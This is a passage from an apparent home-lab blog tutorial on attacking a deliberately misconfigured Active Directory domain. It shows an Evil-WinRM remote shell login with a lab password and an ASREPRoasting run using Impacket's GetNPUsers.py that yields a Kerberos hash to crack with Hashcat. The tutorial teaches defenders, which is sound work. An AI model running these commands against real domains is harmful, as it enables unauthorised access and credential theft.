+<pre class="language-bash"><code v-pre class="language-bash">$ evil-winrm-docker -i 192.168.128.10 -u 'winnie.wonder' -p 'P@ssw0rd123'
+                      
+Evil-WinRM shell v3.5                                
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\winnie.wonder.CICADA\Documents&gt; whoami
+cicada\winnie.wonder</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="asreproasting">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#asreproasting">#</doc-anchor-trigger>
+        <span>ASREPRoasting</span>
+    </h2>
+</doc-anchor-target>
+<p>Assuming we have gathered a list of valid users, we can try to perform an ASREPRoast attack on the domain users to see if any account has the <code v-pre>Do not require Kerberos preauthentication</code> option set. With a valid list of users, we can use <a href="https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py">Get-NPUsers.py</a> from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">GetNPUsers.py CICADA.LOCAL/ -dc-ip 172.16.200.100 -no-pass -usersfile valid_users -format hashcat
+
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] User Administrator doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User dave.hoggins doesnt have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$winnie.wonder@CICADA.LOCAL:ab15aee9c9bd66ee5a0c56e4a30395b9$d030a2c1ab87c23f4424d1cc39f2a469353a2a7fc26c451790729a23bb9658282c7349edb3d67af46072d4b0fe36f9bc71db8d6f7e21f852c809a242c050a77fb0f6c28fb8b7b79de5c4ff60dfa84dd73792f38bf886f909fa3a206c8ac8e594b64ac2c067f4162a6a8e194e4a6fc9b11f8e0d89b0ab379511b3aeab364534fd24509441c301ce1f654bc5e9bf46892418d9ffadcf3992b9493ecdbc1ad142497dcb9323ec1ffcfc72a26efee2ec07a41998bc0a9568eda93b24e84f18abe69004d43a60da7568093f1f88202c21d3abc3078e969ddde45202865ee5af4ded1be7bddffc24da7637c5a53ec2</code></pre>
+</doc-codeblock></div>
+<p>Look like we got a valid hash for the user <code v-pre>winnie.wonder</code>. We can crack the hashes offline using Hashcat with mode <code v-pre>18200</code> to find the password.</p>
+<doc-anchor-target id="conclusion">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#conclusion">#</doc-anchor-trigger>
+        <span>Conclusion</span>
+    </h1>
+</doc-anchor-target>
+<p>The possible attack surface in an AD environment is very large so we just introduced a few misconfigurations in our home lab. We also went over on how an outsider can find these flaws to possible gain a foothold on one of our systems. In the next part of this series we will look at how we can monitor and defend against these attacks.</p>
+
+                            
+                            <!-- Required only on API pages -->
+                            <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                        </div>
+                        <footer class="clear-both">
+                        
+                            <nav class="flex mt-14">
+                                <div class="w-1/2">
+                                    <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../blog/proxmox-homelab-part4/">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        <span>
+                                            <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Newer</span>
+                                            <span class="block mt-1">Active Directory Home Lab with Proxmox - Part 4</span>
+                                        </span>
+                                    </a>
+                                </div>
+                        
+                                <div class="w-1/2">
+                                    <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../blog/proxmox-homelab-part2/">
+                                        <span>
+                                            <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Older</span>
+                                            <span class="block mt-1">Active Directory Home Lab with Proxmox - Part 2</span>
+                                        </span>
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                    </a>
+                                </div>
+                            </nav>
+                        </footer>
+                    </main>
+                </div>
+
+            </div>
+        </div>
+    
+        <div class="border-t dark:border-dark-650">
+            <div class="max-w-core mx-auto px-6 py-6">
+                <footer>
+                    <div class="flex flex-wrap items-center justify-between">
+                        <div class="pt-3">
+                            <ul class="flex flex-wrap items-center text-sm">
+                            </ul>
+                        </div>
+                        <div class="docs-copyright pt-3 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                    </div>
+                
+                    <div class="flex sm:justify-center">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </footer>
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Active Directory Home Lab with Proxmox - Part 3", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
